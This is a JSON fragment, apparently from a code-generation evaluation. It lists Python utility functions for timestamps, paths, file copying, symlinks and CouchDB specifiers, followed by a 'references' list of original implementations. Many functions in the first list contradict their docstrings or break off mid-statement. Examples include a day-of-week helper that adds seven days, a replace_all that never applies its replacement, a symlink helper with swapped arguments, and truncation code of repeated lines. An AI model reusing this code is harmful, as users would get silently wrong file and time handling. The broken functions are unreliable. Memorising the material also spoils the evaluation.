        "def totz(dt, tz=None):\n    \"\"\"\n    Return a Unix timestamp in seconds for the provided datetime. The `totz` function is called\n    on the datetime to convert it to the provided timezone. It will be converted to UTC if no\n    timezone is provided.\n    \"\"\"\n    if tz is None:\n        tz = pytz.utc\n    return dt.astimezone(tz).timestamp()",
        "def totz(dt, tz=None):\n    \"\"\"\n    Return a Unix timestamp in milliseconds for the provided datetime. The `totz` function is\n    called on the datetime to convert it to the provided timezone. It will be converted to UTC if\n    no timezone is provided.\n    \"\"\"\n    if tz is None:\n        tz = pytz.utc\n    return dt.replace(tzinfo=tz).timestamp()",
        "def unix_to_datetime(unix_time, tzin=None, tzout=None):\n    \"\"\"\n    Return the datetime representation of the provided Unix timestamp. By defaults the timestamp is\n    interpreted as UTC. If tzin is set it will be interpreted as this timestamp instead. By default\n    the output datetime will have UTC time. If tzout is set it will be converted in this timezone\n    instead.\n    \"\"\"\n    if tzin is None:\n        tzin = timezone.utc\n    if tzout is None:\n        tzout = timezone.utc\n    return datetime.fromtimestamp(unix_time, tzin)",
        "def unix_timestamp(tz=None):\n    \"\"\"\n    Return the Unix timestamp in milliseconds as a datetime object. If tz is set it will be\n    converted to the requested timezone otherwise it defaults to UTC.\n    \"\"\"\n    if tz is None:\n        tz = pytz.utc\n    return datetime.fromtimestamp(int(time.mktime(time.gmtime()) * 1000), tz)",
        "def trunc_to_precision(dt, precision):\n    \"\"\"Return the datetime truncated to the precision of the provided unit.\"\"\"\n    dt = dt.astimezone(pytz.utc)\n    dt = dt.replace(tzinfo=pytz.utc)\n    dt = dt.replace(hour=0, minute=0, second=0, microsecond=0)\n    dt = dt.replace(microsecond=0)\n    dt = dt.replace(hour=0, minute=0, second=0, microsecond=0)\n    dt = dt.replace(hour=0, minute=0, second=0, microsecond=0)\n    dt = dt.replace(hour=0, minute=0, second=0, microsecond=0)\n    dt = dt.replace(hour=0, minute=0, second=0, microsecond=0)\n    dt = dt.replace(",
        "def day_of_week(self):\n        \"\"\"Return the date for the day of this week.\"\"\"\n        return self.date.replace(day=self.date.day + 7)",
        "def _determine_eol_style_native():\n    \"\"\"\n    Internal function that determines EOL_STYLE_NATIVE constant with the proper value for the\n    current platform.\n    \"\"\"\n    if platform.system() == 'Windows':\n        return EOL_STYLE_WINDOWS\n    elif platform.system() == 'Darwin':\n        return EOL_STYLE_MAC\n    elif platform.system() == 'Linux':\n        return EOL_STYLE_LINUX\n    else:\n        raise ValueError('Unsupported platform: %s' % platform.system())",
        "def normalize_path(path):\n    \"\"\"Normalizes a path maintaining the final slashes.\n\n    Some environment variables need the final slash in order to work.\n\n    Ex. The SOURCES_DIR set by subversion must end with a slash because of the way it is used\n    in the Visual Studio projects.\n\n    :param unicode path:\n        The path to normalize.\n\n    :rtype: unicode\n    :returns:\n        Normalized path\n    \"\"\"\n    path = os.path.normpath(path)\n    path = os.path.expanduser(path)\n    return path",
        "def canonical_path(path):\n    \"\"\"Returns a version of a path that is unique.\n\n    Given two paths path1 and path2:\n        CanonicalPath(path1) == CanonicalPath(path2) if and only if they represent the same file on\n        the host OS. Takes account of case, slashes and relative paths.\n\n    :param unicode path:\n        The original path.\n\n    :rtype: unicode\n    :returns:\n        The unique path.\n    \"\"\"\n    if not path:\n        return path\n\n    if not os.path.isabs(path):\n        path = os.path.normpath(path)\n\n    return os.path.normpath(os.path.join(path, os.path.pardir))",
        "def _replace_slashes(path, strip=False):\n    \"\"\"Replaces all slashes and backslashes with the target separator\n\n    StandardPath:\n        We are defining that the standard-path is the one with only back-slashes in it, either\n        on Windows or any other platform.\n\n    :param bool strip:\n        If True, removes additional slashes from the end of the path.\n    \"\"\"\n    if not strip:\n        return path\n    return os.path.normpath(os.path.join(path, os.path.sep))",
        "def _DoCopyFile(source_filename, target_filename, md5_check=False, copy_symlink=False):\n    \"\"\"Copy a file from source to target.\n\n    :param  source_filename:\n        @see _DoCopyFile\n\n    :param  target_filename:\n        @see _DoCopyFile\n\n    :param bool md5_check:\n        If True, checks md5 files (of both source and target files), if they match, skip this copy\n        and return MD5_SKIP\n\n        Md5 files are assumed to be {source, target} + '.md5'\n\n        If any file is missing (source, target or md5), the copy will always be made.\n\n    :param  copy_symlink:\n        @see _DoCopyFile\n\n    :raises FileAlreadyExistsError:\n        If target_filename already exists,",
        "def copy_file_to_directory(source_filename, target_filename, copy_symlink=False):\n    \"\"\"\n    Copy a file locally to a directory.\n\n    :param unicode source_filename:\n        The filename to copy from.\n\n    :param unicode target_filename:\n        The filename to copy to.\n\n    :param bool copy_symlink:\n        If True and source_filename is a symlink, target_filename will also be created as\n        a symlink.\n\n        If False, the file being linked will be copied instead.\n    \"\"\"\n    if os.path.isdir(target_filename):\n        return\n\n    if os.path.isfile(source_filename):\n        if copy_symlink:\n            os.symlink(source_filename, target_filename)\n        else:\n            os.copy(source_filename, target_filename)\n   ",
        "def copy_file(source_dir, target_dir, create_target_dir=True, md5_check=True):\n    \"\"\"\n    Copy files from the given source to the target.\n\n    :param unicode source_dir:\n        A filename, URL or a file mask.\n        Ex.\n            x:\\coilib50\n            x:\\coilib50\\*\n            http://server/directory/file\n            ftp://server/directory/file\n\n\n    :param unicode target_dir:\n        A directory or an URL\n        Ex.\n            d:\\Temp\n            ftp://server/directory\n\n    :param bool create_target_dir:\n        If True, creates the target path if it doesn't exists.\n\n    :param bool md5_check:\n        .. seealso:: CopyFile\n\n    :raises DirectoryNotFoundError:\n        If target_",
        "def CopyFiles(file_mapping):\n    \"\"\"Copies files into directories, according to a file mapping\n\n    :param list(tuple(unicode,unicode)) file_mapping:\n        A list of mappings between the directory in the target and the source.\n        For syntax, @see: ExtendedPathMask\n\n    :rtype: list(tuple(unicode,unicode))\n    :returns:\n        List of files copied. (source_filename, target_filename)\n\n    .. seealso:: FTP LIMITATIONS at this module's doc for performance issues information\n    \"\"\"\n    source_directory, target_directory = file_mapping\n    source_directory = ExtendedPathMask(source_directory)\n    target_directory = ExtendedPathMask(target_directory)\n    source_files = []\n    target_files = []\n    for source_filename, target_filename in file_mapping:\n        source_directory",
        "def copy_tree(source_dir, target_dir, override=False):\n    \"\"\"\n    Recursively copy a directory tree.\n\n    :param unicode source_dir:\n        Where files will come from\n\n    :param unicode target_dir:\n        Where files will go to\n\n    :param bool override:\n        If True and target_dir already exists, it will be deleted before copying.\n\n    :raises NotImplementedForRemotePathError:\n        If trying to copy to/from remote directories\n    \"\"\"\n    if not os.path.exists(target_dir):\n        os.makedirs(target_dir)\n    for root, dirs, files in os.walk(source_dir):\n        for f in files:\n            target_path = os.path.join(root, f)\n            if not os.path.exists(target_path):\n                os.",
        "def delete_file(target_filename):\n    \"\"\"Deletes the given local filename.\n\n    .. note:: If file doesn't exist this method has no effect.\n\n    :param unicode target_filename:\n        A local filename\n\n    :raises NotImplementedForRemotePathError:\n        If trying to delete a non-local path\n\n    :raises FileOnlyActionError:\n        Raised when filename refers to a directory.\n    \"\"\"\n    if not os.path.exists(target_filename):\n        raise NotImplementedForRemotePathError(\n            \"Trying to delete a non-existent file: %s\" % target_filename\n        )\n\n    if os.path.isdir(target_filename):\n        raise FileOnlyActionError(\n            \"Trying to delete a directory: %s\" % target_filename\n        )\n\n    os.remove(target_filename)",
        "def append_file(filename, contents, eol_style=EOL_STYLE_DEFAULT, encoding=None, binary=False):\n    \"\"\"Appends content to a local file.\n\n    :param unicode filename:\n\n    :param unicode contents:\n\n    :type eol_style: EOL_STYLE_XXX constant\n    :param eol_style:\n        Replaces the EOL by the appropriate EOL depending on the eol_style value.\n        Considers that all content is using only \"\\n\" as EOL.\n\n    :param unicode encoding:\n        Target file's content encoding.\n        Defaults to sys.getfilesystemencoding()\n\n    :param bool binary:\n        If True, content is appended in binary mode. In this case, `contents` must be `bytes` and not\n        `unicode`\n\n    :raises NotImplementedForRemotePathError:\n        If trying to modify a non-local",
        "def move_file(source_filename, target_filename):\n    \"\"\"Moves a file.\n\n    :param unicode source_filename:\n\n    :param unicode target_filename:\n\n    :raises NotImplementedForRemotePathError:\n        If trying to operate with non-local files.\n    \"\"\"\n    if not os.path.exists(target_filename):\n        raise NotImplementedForRemotePathError(\n            \"Cannot move non-local file: %s\" % target_filename)\n\n    if os.path.isdir(target_filename):\n        raise NotImplementedForRemotePathError(\n            \"Cannot move a directory: %s\" % target_filename)\n\n    try:\n        os.rename(source_filename, target_filename)\n    except OSError as e:\n        if e.errno != errno.ENOENT:\n            raise",
        "def move_dir(source_dir, target_dir):\n    \"\"\"Moves a directory.\n\n    :param unicode source_dir:\n\n    :param unicode target_dir:\n\n    :raises NotImplementedError:\n        If trying to move anything other than:\n            Local dir -> local dir\n            FTP dir -> FTP dir (same host)\n    \"\"\"\n    if not os.path.exists(target_dir):\n        os.makedirs(target_dir)\n    if os.path.isdir(source_dir):\n        shutil.move(source_dir, target_dir)\n    else:\n        raise NotImplementedError(\n            \"Can't move %s -> %s (same host)\" % (source_dir, target_dir)\n        )",
        "def read_file(filename, binary=False, encoding=None, newline=None):\n    \"\"\"\n    Reads a file and returns its contents. Works for both local and remote files.\n\n    :param unicode filename:\n\n    :param bool binary:\n        If True returns the file as is, ignore any EOL conversion.\n\n    :param unicode encoding:\n        File's encoding. If not None, contents obtained from file will be decoded using this\n        `encoding`.\n\n    :param None|''|'\\n'|'\\r'|'\\r\\n' newline:\n        Controls universal newlines.\n        See 'io.open' newline parameter documentation for more details.\n\n    :returns str|unicode:\n        The file's contents.\n        Returns unicode string when `encoding` is not None.\n\n    .. seealso:: FTP LIMITATIONS at this module's doc for performance issues information",
        "def read_file(filename, newline=None, encoding=None):\n    \"\"\"\n    Reads a file and returns its contents as a list of lines. Works for both local and remote files.\n\n    :param unicode filename:\n\n    :param None|''|'\\n'|'\\r'|'\\r\\n' newline:\n        Controls universal newlines.\n        See 'io.open' newline parameter documentation for more details.\n\n    :param unicode encoding:\n        File's encoding. If not None, contents obtained from file will be decoded using this\n        `encoding`.\n\n    :returns list(unicode):\n        The file's lines\n\n    .. seealso:: FTP LIMITATIONS at this module's doc for performance issues information\n    \"\"\"\n    if newline is None:\n        newline = os.linesep\n    with io.open(filename, encoding=encoding) as f:\n       ",
        "def list_files(directory):\n    \"\"\"Lists the files in the given directory\n\n    :type directory: unicode | unicode\n    :param directory:\n        A directory or URL\n\n    :rtype: list(unicode) | list(unicode)\n    :returns:\n        List of filenames/directories found in the given directory.\n        Returns None if the given directory does not exists.\n\n        If `directory` is a unicode string, all files returned will also be unicode\n\n    :raises NotImplementedProtocol:\n        If file protocol is not local or FTP\n\n    .. seealso:: FTP LIMITATIONS at this module's doc for performance issues information\n    \"\"\"\n    if not is_local_protocol(directory):\n        raise NotImplementedProtocol(\n            \"List files on non-local FTP servers\"\n        )\n\n    if isinstance(directory, str):\n        directory = URL(directory)\n\n",
        "def create_file(filename, contents, eol_style=None, create_dir=False, encoding=None, binary=False):\n    \"\"\"\n    Create a file with the given contents.\n\n    :param unicode filename:\n        Filename and path to be created.\n\n    :param unicode contents:\n        The file contents as a string.\n\n    :type eol_style: EOL_STYLE_XXX constant\n    :param eol_style:\n        Replaces the EOL by the appropriate EOL depending on the eol_style value.\n        Considers that all content is using only \"\\n\" as EOL.\n\n    :param bool create_dir:\n        If True, also creates directories needed in filename's path\n\n    :param unicode encoding:\n        Target file's content encoding. Defaults to sys.getfilesystemencoding()\n        Ignored if `binary` = True\n\n    :param bool binary",
        "def replace_all(filename, old, new):\n    \"\"\"\n    Replaces all occurrences of \"old\" by \"new\" in the given file.\n\n    :param unicode filename:\n        The name of the file.\n\n    :param unicode old:\n        The string to search for.\n\n    :param unicode new:\n        Replacement string.\n\n    :return unicode:\n        The new contents of the file.\n    \"\"\"\n    with open(filename, 'r') as f:\n        contents = f.read()\n\n    for match in re.finditer(old, contents):\n        match.replace(new)\n\n    with open(filename, 'w') as f:\n        f.write(contents)\n\n    return contents",
        "def create_directory(directory):\n    \"\"\"Create directory including any missing intermediate directory.\n\n    :param unicode directory:\n\n    :return unicode|urlparse.ParseResult:\n        Returns the created directory or url (see urlparse).\n\n    :raises NotImplementedProtocol:\n        If protocol is not local or FTP.\n\n    .. seealso:: FTP LIMITATIONS at this module's doc for performance issues information\n    \"\"\"\n    if not is_local_protocol():\n        raise NotImplementedProtocol()\n\n    if not is_ftp_protocol():\n        raise NotImplementedProtocol()\n\n    if not is_valid_directory(directory):\n        raise ValueError('Invalid directory: %r' % directory)\n\n    return urlparse.urljoin(\n        _get_protocol_root(),\n        _get_directory_path(directory)\n    )",
        "def rmtree(directory, skip_on_error=False):\n    \"\"\"Deletes a directory.\n\n    :param unicode directory:\n\n    :param bool skip_on_error:\n        If True, ignore any errors when trying to delete directory (for example, directory not\n        found)\n\n    :raises NotImplementedForRemotePathError:\n        If trying to delete a remote directory.\n    \"\"\"\n    if not skip_on_error:\n        try:\n            os.rmdir(directory)\n        except OSError as e:\n            if e.errno != errno.ENOENT:\n                raise",
        "def get_network_drives():\n    \"\"\"\n    On Windows, returns a list of mapped network drives\n\n    :return: tuple(string, string, bool)\n        For each mapped netword drive, return 3 values tuple:\n            - the local drive\n            - the remote path-\n            - True if the mapping is enabled (warning: not reliable)\n    \"\"\"\n    try:\n        import win32net\n    except ImportError:\n        return []\n\n    try:\n        net = win32net.Net()\n    except Exception:\n        return []\n\n    return [net.get_drive(drive) for drive in net.get_drive_names()]",
        "def create_symlink(target_path, link_path, override=False):\n    \"\"\"\n    Create a symbolic link at `link_path` pointing to `target_path`.\n\n    :param unicode target_path:\n        Link target\n\n    :param unicode link_path:\n        Fullpath to link name\n\n    :param bool override:\n        If True and `link_path` already exists as a link, that link is overridden.\n    \"\"\"\n    if override:\n        os.symlink(target_path, link_path)\n    else:\n        os.symlink(link_path, target_path)",
        "def read_link_target(path):\n    \"\"\"\n    Read the target of the symbolic link at `path`.\n\n    :param unicode path:\n        Path to a symbolic link\n\n    :returns unicode:\n        Target of a symbolic link\n    \"\"\"\n    try:\n        return os.readlink(path)\n    except OSError:\n        return None",
        "def check_is_local(path):\n    \"\"\"Checks if a given path is local, raise an exception if not.\n\n    This is used in filesystem functions that do not support remote operations yet.\n\n    :param unicode path:\n\n    :raises NotImplementedForRemotePathError:\n        If the given path is not local\n    \"\"\"\n    if not os.path.isdir(path):\n        raise NotImplementedForRemotePathError(path)",
        "def replace_eol(contents, eol_style):\n    \"\"\"Replaces eol on each line by the given eol_style.\n\n    :param unicode contents:\n    :type eol_style: EOL_STYLE_XXX constant\n    :param eol_style:\n    \"\"\"\n    lines = contents.splitlines()\n    for i, line in enumerate(lines):\n        if eol_style == EOL_STYLE_NEWLINE:\n            lines[i] = line.rstrip()\n        elif eol_style == EOL_STYLE_OLDLINE:\n            lines[i] = line.rstrip()\n        elif eol_style == EOL_STYLE_NEWLINE_NEWLINE:\n            lines[i] = line.rstrip() + '\\n'\n        elif eol_style == EOL_STYLE_OLDLINE_NEWLINE:\n            lines[i] = line.rstrip() + '\\n' +",
        "def matches_filename(filename, masks):\n    \"\"\"Verifies if a filename match with given patterns.\n\n    :param str filename: The filename to match.\n    :param list(str) masks: The patterns to search in the filename.\n    :return bool:\n        True if the filename has matched with one pattern, False otherwise.\n    \"\"\"\n    for mask in masks:\n        if fnmatch.fnmatch(filename, mask):\n            return True\n    return False",
        "def search_files(dir_, in_filters=None, out_filters=None, recursive=False, include_root_dir=False, standard_paths=True):\n    \"\"\"Searches for files in a given directory that match with the given patterns.\n\n    :param str dir_: the directory root, to search the files.\n    :param list(str) in_filters: a list with patterns to match (default = all). E.g.: ['*.py']\n    :param list(str) out_filters: a list with patterns to ignore (default = none). E.g.: ['*.py']\n    :param bool recursive: if True search in subdirectories, otherwise, just in the root.\n    :param bool include_root_dir: if True, includes the directory being searched in the returned paths\n    :param bool standard_paths: if True, always uses unix path separators \"/\"\n   ",
        "def _expanduser(path):\n    \"\"\"\n    os.path.expanduser wrapper, necessary because it cannot handle unicode strings properly.\n\n    This is not necessary in Python 3.\n\n    :param path:\n        .. seealso:: os.path.expanduser\n    \"\"\"\n    if PY3:\n        return os.path.expanduser(path)\n    else:\n        return os.path.expandvars(path)",
        "def hash_ini(directory, stringio, base=None, exclude=None, include=None):\n    \"\"\"\n    Helper to iterate over the files in a directory putting those in the passed StringIO in ini\n    format.\n\n    :param unicode directory:\n        The directory for which the hash should be done.\n\n    :param StringIO stringio:\n        The string to which the dump should be put.\n\n    :param unicode base:\n        If provided should be added (along with a '/') before the name=hash of file.\n\n    :param unicode exclude:\n        Pattern to match files to exclude from the hashing. E.g.: *.gz\n\n    :param unicode include:\n        Pattern to match files to include in the hashing. E.g.: *.zip\n    \"\"\"\n    for filename in os.listdir(directory):\n        if filename.startswith('.'):",
        "def random_hex_hashes(iterator_size=None, hash_length=32):\n    \"\"\"\n    Iterator for random hexadecimal hashes\n\n    :param iterator_size:\n        Amount of hashes return before this iterator stops.\n        Goes on forever if `iterator_size` is negative.\n\n    :param int hash_length:\n        Size of each hash returned.\n\n    :return generator(unicode):\n    \"\"\"\n    if iterator_size is None:\n        iterator_size = random.randint(1, 100000)\n\n    while True:\n        yield random_hex(hash_length)",
        "def PushPop2(obj, key, value):\n    \"\"\"A context manager to replace and restore a value using a getter and setter.\n\n    :param object obj: The object to replace/restore.\n    :param object key: The key to replace/restore in the object.\n    :param object value: The value to replace.\n\n    Example::\n\n      with PushPop2(sys.modules, 'alpha', None):\n        pytest.raises(ImportError):\n          import alpha\n    \"\"\"\n    old = getattr(obj, key)\n    setattr(obj, key, value)\n    try:\n        yield\n    finally:\n        setattr(obj, key, old)",
        "def db_specifier_from_string(specifier):\n    \"\"\"Return the database specifier for a database string.\n    \n    This accepts a database name or URL, and returns a database specifier in the\n    format accepted by ``specifier_to_db``. It is recommended that you consult\n    the documentation for that function for an explanation of the format.\n    \"\"\"\n    if isinstance(specifier, basestring):\n        return specifier_to_db(specifier)\n    elif isinstance(specifier, basestring):\n        return specifier\n    else:\n        raise ValueError(\"Invalid database specifier: %r\" % specifier)",
        "def from_string(cls, db_str):\n        \"\"\"Return a CouchDB database instance from a database string.\"\"\"\n        db = CouchDB(db_str)\n        db.connect()\n        return db",
        "def _ensure_db_specifier(self, db_specifier):\n        \"\"\"Make sure a DB specifier exists, creating it if necessary.\"\"\"\n        if db_specifier not in self.db_specifiers:\n            self.db_specifiers[db_specifier] = self.create_db_specifier(db_specifier)",
        "def coerce(obj, field):\n    \"\"\"Exclude NoSet objec\n\n    .. code-block::\n\n        >>> coerce(NoSet, 'value')\n        'value'\n    \"\"\"\n    if obj is NoSet:\n        return field\n    if isinstance(obj, set):\n        return field\n    return obj",
        "def parse_key(key):\n    \"\"\"Parse a hub key into a dictionary of component parts\n\n    :param key: str, a hub key\n    :returns: dict, hub key split into parts\n    :raises: ValueError\n    \"\"\"\n    parts = {}\n    for part in key.split('.'):\n        parts[part] = None\n    return parts",
        "def _check_part(string, part):\n    \"\"\"Raise an exception if string doesn't match a part's regex\n\n    :param string: str\n    :param part: a key in the PARTS dict\n    :raises: ValueError, TypeError\n    \"\"\"\n    if not re.match(part, string):\n        raise ValueError(\n            \"Part '{}' doesn't match regex '{}'\".format(part, part_regex)\n        )",
        "def _apply_default_settings(self):\n        \"\"\" apply default settings to commands\n            not static, shadow \"self\" in eval\n        \"\"\"\n        for command in self.commands:\n            if command.static:\n                continue\n            if command.shadow:\n                continue\n            if command.name in self.settings:\n                command.settings[command.name] = self.settings[command.name]",
        "def add_commands(parser):\n    \"\"\"add commands to parser\"\"\"\n    parser.add_argument('-c', '--config', dest='config',\n                        help='config file', required=True)\n    parser.add_argument('-d', '--debug', dest='debug',\n                        help='enable debug mode', action='store_true')\n    parser.add_argument('-v', '--verbose', dest='verbose',\n                        help='enable verbose mode', action='store_true')\n    parser.add_argument('-r', '--remote', dest='remote',\n                        help='remote server', action='store',\n                        default='127.0.0.1:2379')\n    parser.add_argument('-p', '--port', dest='port',\n                        help='port to listen on', type=int, default=2379)\n    parser.add_argument('-s",
        "def get_config(self):\n        \"\"\"get config for subparser and create commands\"\"\"\n        config = super(Subparser, self).get_config()\n        config.update({\n            'subparsers': {\n                'commands': {\n                    'help': {\n                        'description': 'help text',\n                        'help_text': 'help text',\n                    },\n                    'list': {\n                        'description': 'list of commands',\n                        'help_text': 'list of commands',\n                    },\n                    'create': {\n                        'description': 'create a new command',\n                        'help_text': 'create a new command',\n                    },\n                    'show': {\n                        'description': 'show a command',\n                        'help_text': 'show a command',\n                    },\n                    'update': {\n                        'description': 'update a command',\n                        'help_",
        "def show_version(self):\n        \"\"\"custom command line  action to show version\"\"\"\n        print(\"{0} {1}\".format(self.name, self.version))",
        "def check_file(self, filename):\n        \"\"\"custom command line action to check file exist\"\"\"\n        if not os.path.exists(filename):\n            print(\"File does not exist: {}\".format(filename))\n            return\n        print(\"File exists: {}\".format(filename))",
        "def get_consumer_and_oauth_tokens(consumer_key, consumer_secret,\n                                   oauth_token_key, oauth_token_secret):\n    \"\"\"\n    Return the consumer and oauth tokens with three-legged OAuth process and\n    save in a yaml file in the user's home directory.\n    \"\"\"\n    consumer = OAuthConsumer(consumer_key, consumer_secret)\n    oauth = OAuthToken(oauth_token_key, oauth_token_secret)\n    oauth.set_token_secret(oauth_token_secret)\n    oauth.set_consumer(consumer)\n    return consumer, oauth",
        "def _AddProperties(self):\n    \"\"\"Adds properties for all fields in this protocol message type.\"\"\"\n    for field_number, field in enumerate(self.fields):\n      field_name = self.field_names[field_number]\n      field_type = self.field_types[field_number]\n      field_properties = field_type.GetProperties()\n      if field_properties:\n        self.properties[field_name] = field_properties",
        "def _InternalUnpackAny(msg):\n  \"\"\"Unpacks Any message and returns the unpacked message.\n\n  This internal method is differnt from public Any Unpack method which takes\n  the target message as argument. _InternalUnpackAny method does not have\n  target message type and need to find the message type in descriptor pool.\n\n  Args:\n    msg: An Any message to be unpacked.\n\n  Returns:\n    The unpacked message.\n  \"\"\"\n  if not isinstance(msg, Any):\n    raise ValueError(\"Expected Any message, got %s\" % type(msg))\n\n  # Find the message type in the descriptor pool.\n  target_type = _FindMessageTypeInPool(msg)\n  if target_type is None:\n    raise ValueError(\"Expected Any message, got %s\" % type(msg))\n\n  # Unpack the message.\n  return _UnpackMessage(msg,"
    ],
    "references": [
        [
            "def stop(self):\n        \"\"\"\n        Stops monitoring the predefined directory.\n        \"\"\"\n        with self._status_lock:\n            if self._running:\n                assert self._observer is not None\n                self._observer.stop()\n                self._running = False\n                self._origin_mapped_data = dict()"
        ],
        [
            "def _on_file_moved(self, event: FileSystemMovedEvent):\n        \"\"\"\n        Called when a file in the monitored directory has been moved.\n\n        Breaks move down into a delete and a create (which it is sometimes detected as!).\n        :param event: the file system event\n        \"\"\"\n        if not event.is_directory and self.is_data_file(event.src_path):\n            delete_event = FileSystemEvent(event.src_path)\n            delete_event.event_type = EVENT_TYPE_DELETED\n            self._on_file_deleted(delete_event)\n\n            create_event = FileSystemEvent(event.dest_path)\n            create_event.event_type = EVENT_TYPE_CREATED\n            self._on_file_created(create_event)"
        ],
        [
            "def tear_down(self):\n        \"\"\"\n        Tears down all temp files and directories.\n        \"\"\"\n        while len(self._temp_directories) > 0:\n            directory = self._temp_directories.pop()\n            shutil.rmtree(directory, ignore_errors=True)\n        while len(self._temp_files) > 0:\n            file = self._temp_files.pop()\n            try:\n                os.remove(file)\n            except OSError:\n                pass"
        ],
        [
            "def is_not_exist_or_allow_overwrite(self, overwrite=False):\n        \"\"\"\n        Test whether a file target is not exists or it exists but allow\n        overwrite.\n        \"\"\"\n        if self.exists() and overwrite is False:\n            return False\n        else:  # pragma: no cover\n            return True"
        ],
        [
            "def copyto(self,\n               new_abspath=None,\n               new_dirpath=None,\n               new_dirname=None,\n               new_basename=None,\n               new_fname=None,\n               new_ext=None,\n               overwrite=False,\n               makedirs=False):\n        \"\"\"\n        Copy this file to other place.\n        \"\"\"\n        self.assert_exists()\n\n        p = self.change(\n            new_abspath=new_abspath,\n            new_dirpath=new_dirpath,\n            new_dirname=new_dirname,\n            new_basename=new_basename,\n            new_fname=new_fname,\n            new_ext=new_ext,\n        )\n\n        if p.is_not_exist_or_allow_overwrite(overwrite=overwrite):\n            # \u5982\u679c\u4e24\u4e2a\u8def\u5f84\u4e0d\u540c, \u624d\u8fdb\u884ccopy\n            if self.abspath != p.abspath:\n                try:\n                    shutil.copy(self.abspath, p.abspath)\n                except IOError as e:\n                    if makedirs:\n                        os.makedirs(p.parent.abspath)\n                        shutil.copy(self.abspath, p.abspath)\n                    else:\n                        raise e\n        return p"
        ],
        [
            "def create_client() -> APIClient:\n    \"\"\"\n    Clients a Docker client.\n\n    Will raise a `ConnectionError` if the Docker daemon is not accessible.\n    :return: the Docker client\n    \"\"\"\n    global _client\n    client = _client()\n    if client is None:\n        # First try looking at the environment variables for specification of the daemon's location\n        docker_environment = kwargs_from_env(assert_hostname=False)\n        if \"base_url\" in docker_environment:\n            client = _create_client(docker_environment.get(\"base_url\"), docker_environment.get(\"tls\"))\n            if client is None:\n                raise ConnectionError(\n                    \"Could not connect to the Docker daemon specified by the `DOCKER_X` environment variables: %s\"\n                    % docker_environment)\n            else:\n                logging.info(\"Connected to Docker daemon specified by the environment variables\")\n        else:\n            # Let's see if the Docker daemon is accessible via the UNIX socket\n            client = _create_client(\"unix://var/run/docker.sock\")\n            if client is not None:\n                logging.info(\"Connected to Docker daemon running on UNIX socket\")\n            else:\n                raise ConnectionError(\n                    \"Cannot connect to Docker - is the Docker daemon running? `$DOCKER_HOST` should be set or the \"\n                    \"daemon should be accessible via the standard UNIX socket.\")\n        _client = weakref.ref(client)\n    assert isinstance(client, APIClient)\n    return client"
        ],
        [
            "def path_required(func):\n    \"\"\"Decorate methods when repository path is required.\"\"\"\n    @wraps(func)\n    def wrapper(self, *args, **kwargs):\n        if self.path is None:\n            warnings.warn('Must load (Repository.load_repository) or initialize (Repository.create_repository) the repository first !')\n            return\n        return func(self, *args, **kwargs)\n    return wrapper"
        ],
        [
            "def __clean_before_after(self, stateBefore, stateAfter, keepNoneEmptyDirectory=True):\n        \"\"\"clean repository given before and after states\"\"\"\n        # prepare after for faster search\n        errors    = []\n        afterDict = {}\n        [afterDict.setdefault(list(aitem)[0],[]).append(aitem) for aitem in stateAfter]\n        # loop before\n        for bitem in reversed(stateBefore):\n            relaPath = list(bitem)[0]\n            basename = os.path.basename(relaPath)\n            btype    = bitem[relaPath]['type']\n            alist    = afterDict.get(relaPath, [])\n            aitem    = [a for a in alist if a[relaPath]['type']==btype]\n            if len(aitem)>1:\n                errors.append(\"Multiple '%s' of type '%s' where found in '%s', this should never had happened. Please report issue\"%(basename,btype,relaPath))\n                continue\n            if not len(aitem):\n                removeDirs  = []\n                removeFiles = []\n                if btype == 'dir':\n                    if not len(relaPath):\n                        errors.append(\"Removing main repository directory is not allowed\")\n                        continue\n                    removeDirs.append(os.path.join(self.__path,relaPath))\n                    removeFiles.append(os.path.join(self.__path,relaPath,self.__dirInfo))\n                    removeFiles.append(os.path.join(self.__path,relaPath,self.__dirLock))\n                elif btype == 'file':\n                    removeFiles.append(os.path.join(self.__path,relaPath))\n                    removeFiles.append(os.path.join(self.__path,relaPath,self.__fileInfo%basename))\n                    removeFiles.append(os.path.join(self.__path,relaPath,self.__fileLock%basename))\n                else:\n                    ### MUST VERIFY THAT ONCE pyrepobjectdir IS IMPLEMENTED\n                    removeDirs.append(os.path.join(self.__path,relaPath))\n                    removeFiles.append(os.path.join(self.__path,relaPath,self.__fileInfo%basename))\n                # remove files\n                for fpath in removeFiles:\n                    if os.path.isfile(fpath):\n                        try:\n                            os.remove(fpath)\n                        except Exception as err:\n                            errors.append(\"Unable to clean file '%s' (%s)\"%(fpath, str(err)))\n                # remove directories\n                for dpath in removeDirs:\n                    if os.path.isdir(dpath):\n                        if keepNoneEmptyDirectory or not len(os.listdir(dpath)):\n                            try:\n                                shutil.rmtree(dpath)\n                            except Exception as err:\n                                errors.append(\"Unable to clean directory '%s' (%s)\"%(fpath, str(err)))\n        # return result and errors list\n        return len(errors)==0, errors"
        ],
        [
            "def get_stats(self):\n        \"\"\"\n        Get repository descriptive stats\n\n        :Returns:\n            #. numberOfDirectories (integer): Number of diretories in repository\n            #. numberOfFiles (integer): Number of files in repository\n        \"\"\"\n        if self.__path is None:\n            return 0,0\n        nfiles = 0\n        ndirs  = 0\n        for fdict in self.get_repository_state():\n            fdname = list(fdict)[0]\n            if fdname == '':\n                continue\n            if fdict[fdname].get('pyrepfileinfo', False):\n                nfiles += 1\n            elif fdict[fdname].get('pyrepdirinfo', False):\n                ndirs += 1\n            else:\n                raise Exception('Not sure what to do next. Please report issue')\n        return ndirs,nfiles"
        ],
        [
            "def reset(self):\n        \"\"\"Reset repository instance.\n        \"\"\"\n        self.__path   = None\n        self.__repo   = {'repository_unique_name': str(uuid.uuid1()),\n                         'create_utctime': time.time(),\n                         'last_update_utctime': None,\n                         'pyrep_version': str(__version__),\n                         'repository_information': '',\n                         'walk_repo': []}"
        ],
        [
            "def load_repository(self, path, verbose=True, ntrials=3):\n        \"\"\"\n        Load repository from a directory path and update the current instance.\n        First, new repository still will be loaded. If failed, then old\n        style repository load will be tried.\n\n        :Parameters:\n            #. path (string): The path of the directory from where to load\n               the repository from. If '.' or an empty string is passed,\n               the current working directory will be used.\n            #. verbose (boolean): Whether to be verbose about abnormalities\n            #. ntrials (int): After aquiring all locks, ntrials is the maximum\n               number of trials allowed before failing.\n               In rare cases, when multiple processes\n               are accessing the same repository components, different processes\n               can alter repository components between successive lock releases\n               of some other process. Bigger number of trials lowers the\n               likelyhood of failure due to multiple processes same time\n               alteration.\n\n        :Returns:\n             #. repository (pyrep.Repository): returns self repository with loaded data.\n        \"\"\"\n        assert isinstance(ntrials, int), \"ntrials must be integer\"\n        assert 